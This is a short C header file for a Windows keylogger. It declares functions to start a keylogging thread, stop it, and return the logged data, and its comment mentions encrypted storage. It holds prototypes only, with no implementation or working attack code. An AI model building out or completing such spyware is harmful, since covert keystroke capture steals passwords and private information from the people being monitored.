/*
 * Keylogger Header - Thread-safe keylogger with encrypted storage
 */

#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>

// Function prototypes
DWORD WINAPI keylogger_thread(LPVOID lpParam);
void stop_keylogger();
char* get_keylogger_data();
DWORD WINAPI logg(LPVOID lpParam);  // Backwards compatibility

#endif // KEYLOGGER_H
